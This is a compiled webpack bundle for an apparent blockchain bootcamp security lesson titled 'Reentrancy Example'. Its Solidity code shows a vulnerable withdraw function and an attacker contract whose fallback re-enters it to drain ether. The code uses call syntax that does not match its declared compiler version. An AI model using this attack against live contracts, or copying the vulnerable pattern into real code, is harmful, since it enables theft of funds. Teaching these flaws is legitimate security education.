"use strict";(self.webpackChunkeducation_docs=self.webpackChunkeducation_docs||[]).push([[1102],{3834:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>l,contentTitle:()=>o,default:()=>d,frontMatter:()=>r,metadata:()=>s,toc:()=>i});var a=t(4848),c=t(8453);const r={},o="Reentrancy Example",s={id:"courses/blockchain-developer-bootcamp/S03-smart-contracts/M6-security/L2d-reentrancy-attack/index",title:"Reentrancy Example",description:"This set of contracts shows what a reentrancy attack (SWC-107) looks like.",source:"@site/docs/courses/blockchain-developer-bootcamp/S03-smart-contracts/M6-security/L2d-reentrancy-attack/index.md",sourceDirName:"courses/blockchain-developer-bootcamp/S03-smart-contracts/M6-security/L2d-reentrancy-attack",slug:"/courses/blockchain-developer-bootcamp/S03-smart-contracts/M6-security/L2d-reentrancy-attack/",permalink:"/educationdao.xyz/docs/courses/blockchain-developer-bootcamp/S03-smart-contracts/M6-security/L2d-reentrancy-attack/",draft:!1,unlisted:!1,tags:[],version:"current",lastUpdatedBy:"oliver renwick",lastUpdatedAt:1721055769e3,frontMatter:{},sidebar:"docSidebar",previous:{title:"DoS Attack Contract",permalink:"/educationdao.xyz/docs/courses/blockchain-developer-bootcamp/S03-smart-contracts/M6-security/L2c-dos-attack/"},next:{title:"Integer Over / Underflow",permalink:"/educationdao.xyz/docs/courses/blockchain-developer-bootcamp/S03-smart-contracts/M6-security/L2e-int-under-over-attack/"}},l={},i=[];function u(e){const n={a:"a",code:"code",h1:"h1",p:"p",pre:"pre",...(0,c.R)(),...e.components};return(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)(n.h1,{id:"reentrancy-example",children:"Reentrancy Example"}),"\n",(0,a.jsxs)(n.p,{children:["This set of contracts shows what a reentrancy attack (",(0,a.jsx)(n.a,{href:"https://swcregistry.io/docs/SWC-107",children:"SWC-107"}),") looks like."]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{children:'pragma solidity 0.8.2;\n\n// Example Reentrancy Attack  \ncontract VulnerableContract {    \n  mapping(address => uint) public balances;          \n  \n  function deposit() public payable {        \n    require(msg.value > 1);        \n    balances[msg.sender] += msg.value;    \n  }          \n  \n  function withdraw(uint _amount) public {        \n    require(balances[msg.sender] >= _amount, "Not enough balance!");        \n    msg.sender.call.value(_amount)("");        \n    balances[msg.sender] -= _amount;    \n  }          \n    \n  function getBalance() view public returns(uint) {        \n    return address(this).balance;    \n  }          \n    \n  fallback() payable external {}\n}  \n    \ncontract MaliciousContract {    \n  VulnerableContract vulnerableContract = VulnerableContract(0x08970FEd061E7747CD9a38d680A601510CB659FB);          \n  \n  function deposit() public payable {        \n    vulnerableContract.deposit.value(msg.value)();    \n  }          \n  \n  function withdraw() public {        \n    vulnerableContract.withdraw(1 ether);    \n  }          \n  \n  function getBalance() view public returns(uint) {        \n    return address(this).balance;    \n  }          \n  \n  fallback() payable external {        \n    if(address(vulnerableContract).balance > 1 ether) {            \n      vulnerableContract.withdraw(1 ether);        \n    }    \n  }\n}\n'})})]})}function d(e={}){const{wrapper:n}={...(0,c.R)(),...e.components};return n?(0,a.jsx)(n,{...e,children:(0,a.jsx)(u,{...e})}):u(e)}},8453:(e,n,t)=>{t.d(n,{R:()=>o,x:()=>s});var a=t(6540);const c={},r=a.createContext(c);function o(e){const n=a.useContext(r);return a.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function s(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(c):e.components||c:o(e.components),a.createElement(r.Provider,{value:n},e.children)}}}]);